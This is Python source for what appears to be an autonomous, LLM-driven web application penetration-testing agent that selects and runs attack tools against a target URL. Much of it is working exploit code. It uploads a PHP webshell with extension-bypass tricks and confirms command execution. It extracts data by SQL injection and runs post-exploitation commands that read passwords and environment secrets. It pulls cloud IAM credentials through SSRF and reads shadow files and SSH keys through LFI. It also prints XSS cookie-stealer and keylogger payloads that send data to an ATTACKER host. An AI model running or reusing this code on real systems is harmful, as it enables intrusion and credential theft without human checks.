                    results.append(f"    Payload:  {label}")
                    results.append(f"    Evidence: {out[:300]}")
                    add_vuln("XXE Injection", "Critical", "A03:2021",
                             f"File read via XXE at {ep} using payload: {label}", ep)
                    return "\n".join(results)

    # Test SVG XXE (image upload + SVG)
    svg_payload = (
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    )
    for ep in SESSION.get("agent_upload_endpoints", [])[:3]:
        out = _run(
            f"curl {cf} -s --max-time 10 "
            f"-F 'file=@/dev/stdin;filename=test.svg;type=image/svg+xml' "
            f"{shlex.quote(base + ep if not ep.startswith('http') else ep)} "
            f"<<< {shlex.quote(svg_payload)} 2>&1",
            timeout=15,
        )
        if "root:x:" in out or "daemon:" in out:
            results.append(f"\n  [CRITICAL] SVG XXE CONFIRMED at upload endpoint: {ep}")
            add_vuln("SVG XXE via Upload", "Critical", "A03:2021",
                     f"File read via SVG XXE upload at {ep}", ep)
            return "\n".join(results)

    results.append("\n  [+] No XXE confirmed - server may not process XML or is patched")
    results.append("  [*] Blind XXE requires OOB listener - set up OOB Server (main menu → [O])")
    return "\n".join(results)


def tool_test_open_redirect(url: str, endpoints: str = "", **_) -> str:
    """Test for open redirect via common redirect parameters."""
    cf = _curl_flags()
    base = url.rstrip("/")
    results = ["=== Open Redirect Testing ==="]

    redirect_params = [
        "url", "redirect", "redirect_url", "next", "return", "return_url",
        "goto", "dest", "destination", "r", "ref", "ref_url", "link",
        "continue", "forward", "location", "back", "redir", "target",
    ]

    evil_urls = [
        "https://evil.com",
        "//evil.com",
        "https://evil.com%2F@legitimate.com",
        "javascript:alert(1)",
        "//evil.com/%2F..",
    ]

    test_endpoints = [base, base + "/login", base + "/logout", base + "/auth"]
    if endpoints:
        test_endpoints += [base + e.strip() if not e.strip().startswith("http") else e.strip()
                           for e in endpoints.split(",")]
    # Add discovered endpoints
    for ep in SESSION.get("agent_endpoints", [])[:30]:
        if any(x in ep.lower() for x in ["login", "logout", "redirect", "auth", "out"]):
            test_endpoints.append(ep)

    from concurrent.futures import ThreadPoolExecutor, as_completed

    high_value_params = ["url", "redirect", "next", "return", "goto", "dest", "r", "ref"]
    evil_target = "https://evil.com"

    deduped_endpoints = list(dict.fromkeys(test_endpoints))[:6]
    combos = [(ep, param) for ep in deduped_endpoints for param in high_value_params[:6]]

    def _probe_redirect(ep, param):
        test_url = f"{ep}?{param}={evil_target}"
        out = _run(
            f"curl {cf} -sI --max-time 5 {shlex.quote(test_url)} 2>&1",
            timeout=8,
        )
        location = re.search(r'location:\s*(https?://[^\s]+|//[^\s]+)', out, re.I)
        return ep, param, test_url, location.group(1) if location else None

    found_any = False
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe_redirect, ep, param) for ep, param in combos]
        for fut in as_completed(futures):
            ep, param, test_url, location = fut.result()
            if location and "evil.com" in location:
                results.append("\n  [HIGH] OPEN REDIRECT CONFIRMED!")
                results.append(f"    URL: {test_url}  →  Location: {location}")
                add_vuln("Open Redirect", "High", "A01:2021",
                         f"Redirect via param '{param}' at {ep}", ep)
                found_any = True

    if not found_any:
        results.append("  [ ] No open redirect confirmed in tested combinations")

    return "\n".join(results)


def tool_test_file_upload(url: str, upload_path: str = "", **_) -> str:
    """Test file upload endpoints for webshell upload and bypass techniques."""
    import tempfile
    cf = _curl_flags()
    base = url.rstrip("/")
    results = ["=== File Upload Security Testing ==="]

    # Discover upload endpoints
    upload_eps = SESSION.get("agent_upload_endpoints", [])
    if upload_path:
        upload_eps = [base + upload_path if not upload_path.startswith("http") else upload_path] + upload_eps
    if not upload_eps:
        upload_eps = [base + p for p in ["/upload", "/api/upload", "/files", "/media/upload",
                                          "/profile/avatar", "/api/files", "/attachment"]]
    # Also probe via HTTP
    probe_eps = []
    for ep in upload_eps[:6]:
        code = _run(f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(ep)}", timeout=8)
        if code.strip() not in ("404", ""):
            probe_eps.append(ep)
    if not probe_eps:
        results.append("  [ ] No upload endpoints responding - skipping file upload tests")
        results.append(f"  Probed: {upload_eps[:4]}")
        return "\n".join(results)

    results.append(f"  Active upload endpoints: {probe_eps}")

    # Create temp PHP shell
    php_code = b"<?php system($_GET['cmd']); ?>"
    with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as f:
        f.write(php_code)
        php_path = f.name

    bypass_attempts = [
        (php_path, "shell.php",       "image/jpeg", "Direct PHP upload"),
        (php_path, "shell.phtml",     "image/jpeg", ".phtml extension"),
        (php_path, "shell.php5",      "image/jpeg", ".php5 extension"),
        (php_path, "shell.php.jpg",   "image/jpeg", "Double extension"),
        (php_path, "shell.php%00.jpg","image/jpeg", "Null byte extension"),
        (php_path, "shell.PHP",       "image/jpeg", "Uppercase extension"),
    ]

    for src, fname, ct, label in bypass_attempts:
        for ep in probe_eps[:2]:
            for field in ["file", "upload", "image", "avatar", "attachment"]:
                out = _run(
                    f"curl {cf} -s --max-time 10 "
                    f"-F '{field}=@{src};filename={fname};type={ct}' "
                    f"{shlex.quote(ep)} 2>&1",
                    timeout=15,
                )
                # Look for upload path in response
                uploaded = re.search(r'(?:url|path|location|href)["\s:=]+(["\']?)(/[^"\'<\s]{5,}\.(?:php|phtml|php\d))', out, re.I)
                if uploaded:
                    shell_url = base + uploaded.group(2)
                    test_out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(shell_url + '?cmd=id')}", timeout=12)
                    if "uid=" in test_out:
                        results.append("\n  [CRITICAL] WEBSHELL UPLOAD + RCE CONFIRMED!")
                        results.append(f"    Upload: {ep} via field='{field}' filename='{fname}'")
                        results.append(f"    Shell URL: {shell_url}")
                        results.append(f"    RCE output: {test_out[:200]}")
                        add_vuln("Unrestricted File Upload → RCE", "Critical", "A04:2021",
                                 f"Webshell uploaded at {ep}, executed at {shell_url}", ep)
                        os.unlink(php_path)
                        return "\n".join(results)
                    results.append(f"  [!] Uploaded as {fname} to {ep} but RCE not confirmed - path: {uploaded.group(2)}")
                elif "success" in out.lower() or "uploaded" in out.lower():
                    results.append(f"  [?] Upload may have succeeded ({label}) - verify manually: {ep}")

    try:
        os.unlink(php_path)
    except Exception:
        pass

    results.append("\n  [ ] No unrestricted file upload confirmed")
    results.append("  [*] Manual bypass needed: try magic bytes (GIF89a + PHP), .htaccess, or path traversal in filename")
    return "\n".join(results)


def tool_fuzz_parameters(url: str, method: str = "GET", **_) -> str:
    """Discover hidden GET/POST parameters using arjun or manual probe list."""
    cf = _curl_flags()
    results = ["=== Parameter Discovery ==="]

    if shutil.which("arjun"):
        cmd = (
            f"arjun -u {shlex.quote(url)} "
            f"-m {method} "
            f"--stable -q 2>&1 | head -60"
        )
        out = _run(cmd, timeout=120)
        results.append(f"--- arjun ({method}) ---")
        results.append(out)

        # Extract found params
        found = re.findall(r'\[(?:\+|FOUND)\]\s+(\w+)', out)
        if found:
            existing = SESSION.get("agent_params", [])
            SESSION["agent_params"] = list(set(existing + found))
            results.append(f"\n  [+] Parameters discovered: {found}")
        return "\n".join(results)

    # Manual probe with common parameter names
    results.append("  arjun not installed - using manual parameter probe")
    results.append("  Install: pip install arjun")

    common_params = [
        "id", "user", "username", "email", "page", "file", "url", "redirect",
        "q", "search", "query", "cmd", "exec", "token", "key", "api_key",
        "callback", "next", "return", "lang", "category", "type", "format",
        "debug", "test", "action", "module", "view", "include", "path",
        "data", "input", "value", "name", "order", "sort", "filter",
    ]

    base_out = _run(f"curl {cf} -sL --max-time 8 {shlex.quote(url)}", timeout=12)
    base_len = len(base_out)
    marker   = "ws9x4z"
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def _probe_param(param):
        test_url = f"{url}?{param}={marker}" if "?" not in url else f"{url}&{param}={marker}"
        out = _run(f"curl {cf} -sL --max-time 5 {shlex.quote(test_url)}", timeout=8)
        if marker in out:
            return param, "reflected"
        elif abs(len(out) - base_len) > 300:
            return param, f"length Δ{len(out)-base_len:+d}"
        return param, None

    found_params = []
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe_param, p) for p in common_params]
        for fut in as_completed(futures):
            param, reason = fut.result()
            if reason:
                found_params.append(f"{param} ({reason})")

    if found_params:
        results.append(f"\n  Parameters found: {found_params}")
        existing = SESSION.get("agent_params", [])
        SESSION["agent_params"] = list(set(existing + [p.split(" ")[0] for p in found_params]))
    else:
        results.append("  [ ] No interesting parameters found via manual probe")

    return "\n".join(results)


def tool_test_graphql(url: str, endpoint: str = "/graphql", **_) -> str:
    """Test GraphQL endpoint for introspection, injection, and auth issues."""
    cf = _curl_flags()
    base = url.rstrip("/")
    results = ["=== GraphQL Security Testing ==="]

    # Common GraphQL endpoints
    gql_endpoints = list(dict.fromkeys([
        base + endpoint,
        base + "/graphql", base + "/api/graphql", base + "/query",
        base + "/gql", base + "/api/query",
    ] + [e for e in SESSION.get("agent_endpoints", []) if "graphql" in e.lower()]))[:5]

    active_ep = None
    for ep in gql_endpoints:
        code = _run(f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(ep)}", timeout=8)
        if code.strip() not in ("404", "000", ""):
            active_ep = ep
            break

    if not active_ep:
        results.append("  [ ] No GraphQL endpoint found at common paths")
        return "\n".join(results)

    results.append(f"  [+] GraphQL endpoint active: {active_ep}")

    def gql_post(query: str) -> str:
        payload = json.dumps({"query": query})
        return _run(
            f"curl {cf} -s --max-time 10 "
            f"-X POST "
            f"-H 'Content-Type: application/json' "
            f"-d {shlex.quote(payload)} "
            f"{shlex.quote(active_ep)} 2>&1",
            timeout=15,
        )

    # Test 1: Introspection
    intro_q = "{ __schema { types { name } } }"
    out = gql_post(intro_q)
    if "__schema" in out or '"types"' in out:
        results.append("\n  [HIGH] INTROSPECTION ENABLED - Schema fully exposed!")
        results.append("    All types, queries, mutations, and fields are discoverable")
        add_vuln("GraphQL Introspection Enabled", "High", "A05:2021",
                 "Full schema disclosure via __schema introspection query", active_ep)
        # Extract query names
        type_names = re.findall(r'"name"\s*:\s*"([^"]{3,30})"', out)[:10]
        if type_names:
            results.append(f"    Types found: {type_names}")
    else:
        results.append("  [+] Introspection disabled (good)")

    # Test 2: Field suggestions (often enabled even without introspection)
    sugg_q = "{ __typ { name } }"
    out2 = gql_post(sugg_q)
    if "Did you mean" in out2 or "suggestions" in out2.lower():
        results.append("\n  [MEDIUM] Field suggestions enabled - partial schema disclosure")
        add_vuln("GraphQL Field Suggestions Enabled", "Medium", "A05:2021",
                 "Schema partially guessable via error field suggestions", active_ep)

    # Test 3: Batch query (DoS / auth bypass)
    batch_q = '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
    out3 = _run(
        f"curl {cf} -s --max-time 10 "
        f"-X POST "
        f"-H 'Content-Type: application/json' "
        f"-d {shlex.quote(batch_q)} "
        f"{shlex.quote(active_ep)} 2>&1",
        timeout=15,
    )
    if '"__typename"' in out3 or "QueryBatch" in out3:
        results.append("\n  [MEDIUM] Batch queries allowed - possible DoS / rate limit bypass")

    # Test 4: Common query injection
    injection_q = '{ users(id: "1 OR 1=1") { id email } }'
    out4 = gql_post(injection_q)
    if any(x in out4.lower() for x in ["sql", "syntax", "error", "password", "email"]):
        results.append("\n  [?] Possible injection in query variable - check manually")
        results.append(f"    Query: {injection_q}")
        results.append(f"    Response: {out4[:200]}")

    return "\n".join(results)


def tool_nuclei_scan(url: str, severity: str = "medium", tags: str = "", **_) -> str:
    """Run nuclei template-based vulnerability scanner."""
    if not shutil.which("nuclei"):
        return (
            "[!] nuclei not installed\n"
            "Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n"
            "Or: apt install nuclei  /  snap install nuclei"
        )

    sev_map = {"low": "low,medium,high,critical", "medium": "medium,high,critical",
               "high": "high,critical", "critical": "critical"}
    sev_flag = f"-severity {sev_map.get(severity.lower(), 'medium,high,critical')}"
    tag_flag = f"-tags {shlex.quote(tags)}" if tags else ""

    proxy_flag = ""
    if SESSION.get("proxy"):
        proxy_flag = f"-proxy {shlex.quote(SESSION['proxy'])}"

    cookie_flag = ""
    if SESSION.get("cookies"):
        cookie_flag = f"-H {shlex.quote('Cookie: ' + SESSION['cookies'])}"

    out_file = str(OUTPUT_DIR / "nuclei_agent.json")
    cmd = (
        f"nuclei -u {_safe_url(url)} "
        f"{sev_flag} {tag_flag} {proxy_flag} {cookie_flag} "
        f"-jsonl -o {shlex.quote(out_file)} "
        f"-timeout 10 -retries 1 -rate-limit 50 "
        f"-silent 2>&1"
    )
    output = _run(cmd, timeout=300)

    # Parse JSON results if available
    findings_added = 0
    try:
        if os.path.exists(out_file):
            with open(out_file) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        finding = json.loads(line)
                        name = finding.get("info", {}).get("name", "Unknown")
                        sev_found = finding.get("info", {}).get("severity", "info").capitalize()
                        matched = finding.get("matched-at", url)
                        owasp_tags = finding.get("info", {}).get("classification", {}).get("owasp-id", [""])
                        owasp_tag = owasp_tags[0] if owasp_tags else ""
                        if sev_found.lower() not in ("info", "unknown"):
                            add_vuln(f"[Nuclei] {name}", sev_found, owasp_tag,
                                     f"Nuclei template match at {matched}", matched)
                            findings_added += 1
                    except json.JSONDecodeError:
                        continue
    except Exception:
        pass

    result = f"=== nuclei ===\n{output}"
    if findings_added:
        result += f"\n\n[+] {findings_added} findings added to report from nuclei"
    return result


def tool_generate_report(**_) -> str:
    """Generate professional HTML security assessment report."""
    try:
        from modules import reporting
        path = reporting.save_html()
        # Count what the report actually shows: raw vulns_found double-counts
        # anything recorded through both stores.
        count = len(reporting._sorted_findings())
        return (
            f"REPORT GENERATED\n"
            f"  Path: {path}\n"
            f"  Findings: {count}\n"
            f"  Open in browser: firefox {path} &"
        )
    except Exception as exc:
        return f"[!] Report error: {exc}"


def tool_web_search(query: str, search_type: str = "web", **_) -> str:
    """Search web for CVEs, exploits, advisories."""
    results = [f"=== Web Search: {query} ==="]
    if search_type == "cve":
        # Extract tech+version from query for NVD search
        results.append(web_search_cve(query))
    else:
        results.append(web_search_ddg(query))

    # Always try NVD if version-like pattern detected
    version_match = re.search(r'(\d+\.\d+[\.\d]*)', query)
    tech_match    = re.search(r'^([A-Za-z][A-Za-z0-9\-]+)', query)
    if version_match and tech_match and search_type != "cve":
        cve_result = web_search_cve(tech_match.group(1), version_match.group(1))
        if "No CVEs" not in cve_result and "error" not in cve_result.lower():
            results.append(f"\n--- NVD CVEs ---\n{cve_result}")

    return "\n".join(results)


def tool_exploit_vulnerability(url: str, vuln_type: str, payload: str = "",
                                param: str = "", **_) -> str:
    """Deep exploitation of a confirmed vulnerability."""
    cf = _curl_flags()
    base = url.rstrip("/")
    results = [f"=== Deep Exploitation: {vuln_type.upper()} at {url} ==="]
    vuln_lower = vuln_type.lower()

    if vuln_lower == "sqli":
        # Try to extract database name, tables, users
        results.append("--- SQLi Data Extraction ---")
        if shutil.which("sqlmap"):
            data_flag = f"--data={shlex.quote(payload)}" if payload and "=" in payload else ""
            param_flag = f"-p {shlex.quote(param)}" if param else ""
            cmd = (
                f"sqlmap -u {_safe_url(url)} {data_flag} {param_flag} "
                f"--batch --level=2 --risk=2 --dbs --timeout=10 "
                f"--output-dir=/tmp/sqlmap_exploit 2>&1 | tail -30"
            )
            out = _run(cmd, timeout=180)
            results.append(out)
            if "available databases" in out.lower() or "database:" in out.lower():
                add_vuln("SQLi - Database Enumeration", "Critical", "A03:2021",
                         "Database names extracted via SQLi exploitation", url)
        else:
            # Manual extraction probes
            for probe in ["' UNION SELECT 1,database(),3--", "' UNION SELECT 1,user(),3--",
                          "' UNION SELECT 1,@@version,3--"]:
                test_url = f"{url}?{param}={probe}" if param else url
                out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(test_url)}", timeout=12)
                if re.search(r'[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+|root@|mysql|postgres', out):
                    results.append(f"  [+] Data leak: {out[:200]}")

    elif vuln_lower in ("rce", "cmdi", "command_injection"):
        results.append("--- RCE Deep Exploitation ---")
        commands = ["id", "whoami", "uname -a", "cat /etc/passwd",
                    "ps aux | head -10", "env | grep -i pass", "ls /"]
        for cmd in commands:
            if param:
                test_url = f"{base}?{param}={shlex.quote(';' + cmd)}"
            else:
                test_url = f"{base}?cmd={shlex.quote(cmd)}"
            out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(test_url)}", timeout=12)
            if out and "(no output)" not in out and len(out) > 10:
                results.append(f"  CMD[{cmd}]: {out[:200]}")

    elif vuln_lower == "ssrf":
        results.append("--- SSRF Deep Exploitation ---")
        # Cloud metadata full extraction
        metadata_paths = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ]
        for meta_url in metadata_paths:
            test_url = f"{base}?{param or 'url'}={meta_url}"
            out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(test_url)}", timeout=12)
            if out and len(out) > 20 and "(no output)" not in out:
                results.append(f"  [{meta_url}]: {out[:300]}")
                if any(x in out for x in ["AccessKeyId", "Token", "iam", "credentials"]):
                    add_vuln("SSRF - Cloud Credentials Exposed", "Critical", "A10:2021",
                             f"IAM credentials accessible via SSRF at {url}", url)

    elif vuln_lower == "lfi":
        results.append("--- LFI Deep Exploitation ---")
        sensitive_files = [
            "/etc/shadow", "/etc/ssh/ssh_host_rsa_key",
            "/var/www/html/.env", "/var/www/html/config.php",
            "/proc/self/environ", "/home/www-data/.ssh/id_rsa",
        ]
        for sfile in sensitive_files:
            payloads_try = [f"../../../.{sfile}", sfile,
                            f"php://filter/convert.base64-encode/resource={sfile}"]
            for p in payloads_try:
                test_url = f"{base}?{param or 'file'}={p}"
                out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(test_url)}", timeout=12)
                if any(x in out for x in ["root:", "ssh-rsa", "BEGIN", "DB_", "password"]):
                    results.append(f"  [+] {sfile}: {out[:300]}")
                    add_vuln("LFI - Sensitive File Read", "Critical", "A01:2021",
                             f"Read {sfile} via LFI at {url}", url)
                    break

    elif vuln_lower == "xss":
        results.append("--- XSS PoC Generation ---")
        session_steal = (
            "<script>document.location='http://ATTACKER/?c='+document.cookie;</script>"
        )
        keylogger = (
            "<script>document.onkeypress=function(e){new Image().src='http://ATTACKER/?k='+e.key}</script>"
        )
        results.append(f"  Session stealer:\n    {session_steal}")
        results.append(f"  Keylogger:\n    {keylogger}")
        results.append("  Use with OOB Server (Main menu → [O]) to capture cookies")

    elif vuln_lower in ("ssti", "template_injection"):
        results.append("--- SSTI RCE Escalation ---")
        rce_payloads = [
            ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2"),
            ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "FreeMarker"),
            ("<%= `id` %>", "ERB"),
            ("#{`id`}", "Ruby ERB"),
        ]
        for p, engine in rce_payloads:
            test_url = f"{base}?{param or 'q'}={shlex.quote(p)}"
            out = _run(f"curl {cf} -s --max-time 8 {shlex.quote(test_url)}", timeout=12)
            if "uid=" in out:
                results.append(f"  [CRITICAL] SSTI RCE via {engine}: {out[:200]}")
                add_vuln("SSTI → RCE", "Critical", "A03:2021",
                         f"Remote code execution via SSTI ({engine})", url)
                break

    # Record knowledge
    target_domain = re.sub(r'^https?://', '', url).split('/')[0]
    kb_record_finding(target_domain, f"{vuln_type.upper()} Exploitation",
                      "Critical", "A03:2021",
                      f"Deep exploitation at {url}", payload, url)

    return "\n".join(results)


# ── Tool map ──────────────────────────────────────────────────────────────────

TOOL_MAP = {
    "recon_target":           tool_recon_target,
    "directory_scan":         tool_directory_scan,
    "check_security_headers": tool_check_security_headers,
    "find_sensitive_files":   tool_find_sensitive_files,
    "test_sql_injection":     tool_test_sql_injection,
    "test_xss":               tool_test_xss,
    "test_ssrf":              tool_test_ssrf,
    "test_path_traversal":    tool_test_path_traversal,
    "test_command_injection":  tool_test_command_injection,
    "test_authentication":    tool_test_authentication,
    "scan_vulnerabilities":   tool_scan_vulnerabilities,
    "check_ssl_tls":          tool_check_ssl_tls,
    "test_ssti":              tool_test_ssti,
    "report_finding":         tool_report_finding,
    "finish_assessment":      tool_finish_assessment,
    "analyze_source_code":    tool_analyze_source_code,
    # New tools
    "crawl_target":           tool_crawl_target,
    "test_cors":              tool_test_cors,
    "test_xxe":               tool_test_xxe,
    "test_open_redirect":     tool_test_open_redirect,
    "test_file_upload":       tool_test_file_upload,
    "fuzz_parameters":        tool_fuzz_parameters,
    "test_graphql":           tool_test_graphql,
    "nuclei_scan":            tool_nuclei_scan,
    "generate_report":        tool_generate_report,
    "web_search":             tool_web_search,
    "exploit_vulnerability":  tool_exploit_vulnerability,
}

# ── Helper functions ──────────────────────────────────────────────────────────

def _print_agent_header(round_num: int, tool_name: str) -> None:
    bar = f"{AGENT_GREEN}{'─' * 68}{RST}"
    print(f"\n{bar}")
    print(
        f"{AGENT_GREEN}{BOLD}  Round {round_num:02d}{RST}  "
        f"{AGENT_CYAN}{BOLD}{tool_name}{RST}"
    )
    print(bar)


def _print_tool_result(name: str, result: str) -> None:
    lines = result.splitlines()[:20]
    print(f"  {DIM}Result ({name}):{RST}")
    for line in lines:
        print(f"  {SOFT_WHITE}{line}{RST}")
    if len(result.splitlines()) > 20:
        print(f"  {DIM}... (showing 20/{len(result.splitlines())} lines){RST}")


def _inject_session(args: dict) -> dict:
    """Inject session cookies/auth into tool args where applicable."""
    # Tools call _curl_flags() directly using SESSION - no injection needed here.
    return args


def _execute_tool(name: str, args: dict) -> str:
    fn = TOOL_MAP.get(name)
    if fn is None:
        return f"[!] Unknown tool: {name}"
    try:
        return fn(**args)
    except Exception as exc:
        return f"[!] Tool {name} error: {exc}"


def _build_tools_for_ollama() -> list:
    """Convert TOOLS list to compact Ollama/OpenAI function-calling format."""
    result = []
    for t in TOOLS:
        result.append({
            "type": "function",
            "function": {
                "name": t["name"],
                "description": t["description"][:300],  # keep compact for Ollama
                "parameters": t["input_schema"],
            },
        })
    return result


def _ollama_models() -> list:
    """Return available Ollama model names."""
    return _get_ollama_models()


def _setup_backend():
    """
    Resolve AI backend.
    Priority: Ollama → Claude → OpenAI → Groq → Gemini → DeepSeek
    Returns (client_or_None, model_str, backend_label, backend_type).
    """
    # 1. Ollama first - free, local, no key needed
    models = _get_ollama_models()
    if models:
        model = SESSION.get("_ollama_model") or _best_model(models)
        return None, model, f"Ollama ({model})", "ollama"

    # 2. Claude
    api_key = os.environ.get("ANTHROPIC_API_KEY", "") or SESSION.get("_anthropic_key", "")
    if _HAS_ANTHROPIC and api_key:
        try:
            client = anthropic.Anthropic(api_key=api_key)
            return client, MODEL, f"Claude {MODEL}", "claude"
        except Exception as exc:
            warn(f"Claude API init failed: {exc}")

    # 3. OpenAI
    oai_key = os.environ.get("OPENAI_API_KEY", "") or SESSION.get("_openai_key", "")
    if oai_key:
        return {"key": oai_key, "base": "https://api.openai.com/v1"}, \
               "gpt-4o", "OpenAI GPT-4o", "openai"

    # 4. Groq (free tier, very fast, OpenAI-compatible)
    groq_key = os.environ.get("GROQ_API_KEY", "") or SESSION.get("_groq_key", "")
    if groq_key:
        return {"key": groq_key, "base": "https://api.groq.com/openai/v1"}, \
               "llama-3.3-70b-versatile", "Groq (llama-3.3-70b)", "openai"

    # 5. Gemini
    gem_key = os.environ.get("GEMINI_API_KEY", "") or SESSION.get("_gemini_key", "")
    if gem_key:
        return {"key": gem_key}, "gemini-2.0-flash", "Gemini 2.0 Flash", "gemini"

    # 6. DeepSeek (OpenAI-compatible)
    ds_key = os.environ.get("DEEPSEEK_API_KEY", "") or SESSION.get("_deepseek_key", "")
    if ds_key:
        return {"key": ds_key, "base": "https://api.deepseek.com/v1"}, \
               "deepseek-chat", "DeepSeek Chat", "openai"

    return None, "", "", ""


def _ai_call(client, model: str, backend_type: str, messages: list,
             system: str = "", tools: list = None) -> tuple[str, any]:
    """
    Unified AI call across all backends.
    Returns (text_response, tool_use_block_or_None).
    """
    if backend_type == "claude" and client:
        resp = client.messages.create(
            model=model, max_tokens=MAX_TOKENS, system=system,
            tools=tools or [], messages=messages,
        )
        tool_block = next((b for b in resp.content if b.type == "tool_use"), None)
        text_block = next((b for b in resp.content if b.type == "text"), None)
        return (text_block.text if text_block else ""), tool_block

    elif backend_type == "openai" and isinstance(client, dict):
        # Format tools for OpenAI
        oai_tools = None
        if tools:
            oai_tools = [{"type": "function", "function": {
                "name": t["name"], "description": t["description"][:300],
                "parameters": t["input_schema"],
            }} for t in tools]
        msgs = ([{"role": "system", "content": system}] + messages) if system else messages
        raw = _openai_chat(client["key"], model, msgs,
                           base_url=client.get("base", "https://api.openai.com/v1"),
                           tools=oai_tools)
        # Check if raw is JSON tool call
        try:
            data = json.loads(raw)
            if "tool" in data:
                return "", SimpleNamespace(name=data["tool"], input=data.get("args", {}),
                                           type="tool_use", id="oai_0")
        except Exception:
            pass
        return raw, None

    elif backend_type == "gemini" and isinstance(client, dict):
        msgs = ([{"role": "user", "content": system}] + messages) if system else messages
        raw = _gemini_chat(client["key"], model, msgs)
        return raw, None

    elif backend_type == "ollama":
        # Use generate endpoint for tool selection
        return "", None  # handled separately in run_agent

    return "", None


def _plan_attack(client, model: str, backend_type: str, target: str) -> list:
    """
    Planning phase - AI generates attack plan before execution.
    Returns list of planned steps.
    """
    domain = re.sub(r'^https?://', '', target).split('/')[0]
    prior_knowledge = kb_get_target_context(domain)

    planning_prompt = f"""You are an expert web application penetration tester.
Create a prioritized attack plan for: {target}

Prior intelligence:
{prior_knowledge}

Generate exactly 6 attack priorities in this JSON format:
{{"plan": [
  {{"step": 1, "action": "recon + fingerprint", "tool": "recon_target", "reason": "identify tech stack"}},
  {{"step": 2, "action": "...", "tool": "...", "reason": "..."}}
]}}

Focus on the highest-risk attack vectors for this target type. No extra text."""

    raw = ""
    if backend_type == "claude" and client:
        try:
            resp = client.messages.create(
                model=model, max_tokens=1000,
                messages=[{"role": "user", "content": planning_prompt}],
            )
            raw = resp.content[0].text
        except Exception:
            pass
    elif backend_type == "openai" and isinstance(client, dict):
        raw = _openai_chat(client["key"], model,
                           [{"role": "user", "content": planning_prompt}],
                           base_url=client.get("base", "https://api.openai.com/v1"),
                           timeout=30)
    elif backend_type == "ollama":
        raw = _ollama_generate(model, planning_prompt, timeout=60, num_predict=400)

    try:
        data = json.loads(re.search(r'\{.*\}', raw, re.S).group(0))
        steps = data.get("plan", [])
        return steps
    except Exception:
        return []


def _mentor_check(completed: list, hints: dict, last_results: list) -> str:
    """
    Mentor/supervisor agent - detects stuck loops and suggests new strategy.
    Returns advice string if stuck, empty string if OK.
    """
    if len(completed) < 5:
        return ""

    # Check for tool repetition (same tool called 3+ times)
    from collections import Counter
    counts = Counter(completed[-10:])
    repeated = [(t, c) for t, c in counts.items() if c >= 3]
    if repeated:
        return f"STUCK: {repeated[0][0]} called {repeated[0][1]}x - try different approach"

    # Check for no new findings after 8 tools
    if len(completed) >= 8:
        recent = completed[-8:]
        # If we haven't found anything in last 8 tools
        findings = len(SESSION.get("vulns_found", []))
        if findings == 0 and len(completed) > 10:
            return "No findings after 10 tools - focus on auth/logic flaws or check if WAF blocking"

    # Check if same result pattern repeated (all 404s, all no-output)
    if last_results and len(last_results) >= 3:
        recent_results = last_results[-3:]
        if all(len(r) < 50 or "(no output)" in r for r in recent_results):
            return "Multiple empty responses - target may be offline, rate-limiting, or WAF blocking all probes"

    return ""


# ── Main agent loop ───────────────────────────────────────────────────────────

def run_agent(client, model: str, target_url: str, md_log: AgentMarkdownLog,
              backend_type: str = "ollama") -> list:
    """
    Main tool-use round loop with planning phase, mentor agent, and knowledge base.
    AI picks tool → execute → feed result → repeat.
    """
    # ── Knowledge base init ────────────────────────────────────────────────────
    kb_increment_run()
    domain = re.sub(r'^https?://', '', target_url).split('/')[0]
    prior_ctx = kb_get_target_context(domain)

    # ── Planning phase ─────────────────────────────────────────────────────────
    if backend_type in ("claude", "openai", "gemini"):
        info("Planning attack strategy...")
        plan = _plan_attack(client, model, backend_type, target_url)
        if plan:
            print(f"\n  {NEON_CYN}{BOLD}Attack Plan:{RST}")
            for step in plan:
                print(f"  {NEON_GRN}[{step.get('step')}]{RST} {step.get('action')} "
                      f"- {SOFT_WHITE}{step.get('reason', '')}{RST}")
            print()
        SESSION["_attack_plan"] = plan
    elif backend_type == "ollama":
        # Lightweight planning for Ollama
        info("Ollama: using smart sequential strategy")

    system = _build_claude_system() if backend_type == "claude" else OLLAMA_SYSTEM

    messages = [
        {
            "role": "user",
            "content": (
                f"Target: {target_url}\n"
                f"Prior intelligence: {prior_ctx[:300]}\n"
                f"Begin the web application security assessment."
            ),
        }
    ]

    completed_tools: list[str] = []
    last_results:    list[str] = []  # for mentor check
    round_num = 0
    mission_done = False

    while not mission_done and round_num < MAX_ROUNDS:
        round_num += 1

        # ── Get AI decision ────────────────────────────────────────────────────
        tool_name = ""
        tool_args: dict = {}
        tool_id = "call_0"

        try:
          _dummy_check = round_num  # allows KeyboardInterrupt to surface
        except KeyboardInterrupt:
            warn("Interrupted - saving progress…")
            break

        # ── Mentor check every 5 rounds ────────────────────────────────────────
        hints_for_mentor = _analyze_result(last_results[-1] if last_results else "")
        if round_num % 5 == 0 and round_num > 0:
            mentor_advice = _mentor_check(completed_tools, hints_for_mentor, last_results)
            if mentor_advice:
                warn(f"Mentor: {mentor_advice}")
                SESSION["_mentor_advice"] = mentor_advice

        if backend_type == "claude" and client:
            # Anthropic Claude tool_use
            try:
                resp = client.messages.create(
